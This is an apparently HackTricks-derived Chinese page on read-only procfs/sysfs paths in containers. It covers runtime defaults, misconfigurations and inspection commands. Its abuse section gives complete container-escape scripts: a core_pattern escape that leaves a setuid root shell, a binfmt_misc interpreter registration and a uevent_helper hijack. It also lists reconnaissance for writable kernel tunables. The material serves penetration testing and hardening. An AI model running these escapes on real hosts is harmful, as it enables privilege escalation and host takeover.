# 只读系统路径

{{#include ../../../../banners/hacktricks-training.md}}

只读系统路径是与 masked paths 分开的另一种防护。运行时不是完全隐藏某个路径，而是将其暴露出来但以只读方式挂载。这在某些 procfs 和 sysfs 的位置很常见，那里的读取可能是可以接受的或在运行上必要，但写入会太危险。

目的很简单：许多内核接口在可写时会变得更危险。只读挂载并不会完全消除侦察价值，但它可以阻止被攻破的工作负载通过该路径修改面向内核的底层文件。

## 操作

运行时经常将 proc/sys 视图的部分标记为只读。根据运行时和主机的不同，这可能包含如下路径：

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

实际列表会有所不同，但模式相同：在需要时允许可见性，默认拒绝变更。

## 实验

检查 Docker 声明的只读路径列表：
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
从容器内部检查已挂载的 proc/sys 视图：
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## 安全影响

只读系统路径能缩小一大类对主机造成影响的滥用。即便攻击者能检查 procfs 或 sysfs，无法在其中写入仍会移除许多直接的修改途径，这些途径涉及内核可调参数、崩溃处理程序、模块加载辅助程序或其他控制接口。暴露并未完全消失，但从信息泄露向对主机施加影响的转变会变得更困难。

## 错误配置

主要错误包括取消屏蔽或将敏感路径重新挂载为读写、使用可写的 bind mounts 直接暴露主机的 proc/sys 内容，或使用实际上绕过更安全运行时默认设置的特权模式。在 Kubernetes 中，`procMount: Unmasked` 与特权工作负载常常与较弱的 proc 保护同时出现。另一个常见的运维错误是假设由于运行时通常将这些路径以只读方式挂载，所有工作负载都会继承该默认设置。

## 滥用

如果保护薄弱，可先查找可写的 proc/sys 条目：
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
当存在可写条目时，高价值的后续路径包括：
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
这些命令可以揭示：

- 在 `/proc/sys` 下可写的条目通常意味着容器可以修改宿主内核行为，而不仅仅是查看它。
- `core_pattern` 尤其重要，因为可写的面向宿主的值可以通过在设置 pipe handler 后让进程崩溃来变成宿主代码执行路径。
- `modprobe` 揭示内核在模块加载相关流程中使用的 helper；当可写时，它是一个经典的高价值目标。
- `binfmt_misc` 告诉你是否可以进行自定义解释器注册。如果 registration 是可写的，这可以成为一个 execution primitive，而不仅仅是信息 leak。
- `panic_on_oom` 控制整宿主的内核决策，因此可以将资源耗尽转变为宿主拒绝服务。
- `uevent_helper` 是可写 sysfs helper 路径产生宿主上下文执行的最明显示例之一。

有趣的发现包括那些本应为只读却可写的面向宿主的 proc 控制项或 sysfs 条目。到那时，工作负载就从受限的容器视角转向对内核产生实质性影响。

### 完整示例： `core_pattern` Host Escape

如果从容器内可以写入 `/proc/sys/kernel/core_pattern` 并且它指向宿主内核视图，那么它可以在崩溃后被滥用来执行 payload：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
如果路径确实到达主机内核，payload 会在主机上运行并留下一个 setuid shell。

### 完整示例：`binfmt_misc` 注册

如果 `/proc/sys/fs/binfmt_misc/register` 可写，自定义解释器注册在匹配的文件被执行时可以产生 code execution：
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
在面向主机且可写的 `binfmt_misc` 上，结果是在内核触发的解释器路径中执行代码。

### 完整示例：`uevent_helper`

如果 `/sys/kernel/uevent_helper` 是可写的，当匹配事件触发时，内核可能会调用位于主机路径的 helper 程序：
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
之所以如此危险，是因为 helper path 从主机文件系统的角度解析，而不是在安全的仅容器上下文中解析。

## 检查

这些检查用于判断 procfs/sysfs 的暴露在预期情况下是否为只读，以及工作负载是否仍然能够修改敏感的内核接口。
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
值得注意的是：

- 一个正常的 hardened workload 应该只暴露很少可写的 /proc/sys 条目。
- 可写的 `/proc/sys` 路径常常比普通的只读访问更重要。
- 如果 runtime 声称某路径为只读但实际上是可写的，应仔细检查 mount propagation、bind mounts 和 privilege 设置。

## 运行时默认

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化 |
| --- | --- | --- | --- |
| Docker Engine | 默认启用 | Docker 为敏感的 proc 条目定义了默认的只读路径列表 | 暴露主机 /proc/sys 挂载，`--privileged` |
| Podman | 默认启用 | Podman 会应用默认的只读路径，除非显式放宽 | `--security-opt unmask=ALL`、广泛的主机挂载、`--privileged` |
| Kubernetes | 继承运行时默认设置 | 使用底层 runtime 的只读路径模型，除非被 Pod 设置或主机挂载弱化 | `procMount: Unmasked`、privileged workloads、可写的主机 /proc/sys 挂载 |
| containerd / CRI-O under Kubernetes | 运行时默认 | 通常依赖 OCI/runtime 的默认设置 | 同 Kubernetes 行；直接修改 runtime 配置会削弱该行为 |

关键点是：只读的系统路径通常是运行时的默认设置，但很容易被 privileged 模式或主机 bind mounts 所破坏。
